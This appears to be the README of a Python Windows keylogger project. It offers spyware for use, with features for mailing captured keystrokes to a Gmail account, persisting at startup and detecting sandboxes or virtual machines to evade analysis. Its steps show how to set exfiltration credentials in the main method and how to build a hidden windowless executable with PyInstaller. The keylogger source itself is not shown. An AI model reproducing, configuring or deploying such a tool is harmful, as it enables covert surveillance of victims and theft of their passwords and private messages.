# Python Keylogger

This program is an object oriented windows keylogger written in python3.

## Installation

This program requires:
* [Python3](https://www.python.org/downloads/)
* [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
* [Pynput](https://pypi.org/project/pynput/)
* [Pyinstaller](https://pypi.org/project/PyInstaller/)

1. Download the repository using github or git.
2. Install the modules above one by one or install them all at once by running `python -m pip install -r requirements.txt`

## Features
* Ability to send logs to any gmail account.
* Ability to store logs locally.
* Ability to add to startup.
* Ability to log special characters.
* Ability to capture window mouse clicks.
* Ability to check for sandboxie/virtual machine.
* And more...

## Usage

1. Open `src/main.py` in a text editor
2. Naviate to the main method:

```
if __name__ == "__main__":
    main = main(60, "c:/temp/log.txt")

    # main = main(180)
    # main = main(180, "", True, True, True, True)
    # main.override_gmail("email@gmail.com", "pass")

    main.start()
```

3. Modify the constructor arguments such as in the commented examples where arg1 is the time before exporting logs, arg2 is the path to export the logs to (if sending logs by email, set this to ""), and arg3-6 are bools for adding to startup, logging clicks, checking for virtual machine, and checking for sandboxie correspondingly.

4. Uncomment `override_gmail()` with an gmail account and password as corresponding arguments if sending logs by email.

5. Save the file and right-click while holding shift to open powershell window.
6. Enter `pyinstaller main.py --onefile --windowed` in the console to compile the python file as a single .exe.
7. To stop the program enter `shift+F1` or kill the program in task manager.
